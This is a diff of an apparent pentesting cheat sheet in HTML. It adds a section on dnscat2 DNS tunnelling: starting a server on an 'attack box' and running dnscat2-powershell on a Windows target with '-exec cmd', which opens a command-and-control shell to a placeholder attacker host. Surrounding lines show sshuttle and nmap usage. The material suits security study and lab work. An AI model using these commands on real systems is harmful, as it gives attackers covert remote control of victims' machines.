@@ -178,6 +178,25 @@ sshuttle <span class="nt">-r</span> &lt;username&gt;@&lt;compromised server IP&g
 nmap <span class="nt">-sV</span> <span class="nt">-p3389</span> <span class="nt">-Pn</span> 172.16.5.19
 </code></pre></div>
 
+<h2>dnscat2 for DNS encrypted tunneling</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># dnscat2 allows you to run an encrypted command and control channel</span>
+<span class="c"># through DNS, with TXT records. extremely useful for isolated targets.</span>
+
+<span class="c"># on your attack box, start dnscat2 server</span>
+dnscat2-server <span class="nt">--dns</span> <span class="nv">host</span><span class="o">=</span>&lt;attack box IP&gt;,port<span class="o">=</span>53,domain<span class="o">=</span>&lt;domain name&gt;
+
+<span class="c"># on a windows target, download dnscat2-powershell:</span>
+<span class="c"># https://github.com/lukebaggett/dnscat2-powershell</span>
+
+<span class="c"># import the module</span>
+import-module .<span class="se">\d</span>nscat2.ps1
+
+<span class="c"># initiate the connection to the server on our attack box</span>
+<span class="c"># make sure port 53 is opened for the target</span>
+start-dnscat2 <span class="nt">-dnsserver</span> &lt;attack box IP&gt; <span class="nt">-domain</span> &lt;domain name&gt; <span class="nt">-presharedsecret</span> &lt;secret shown with dnscat2-server&gt; <span class="nt">-exec</span> cmd
+</code></pre></div>
+
 <h2>chisel</h2>
 
 <p>for compatibility with powershell-empire, use chisel 1.7.2.</p>
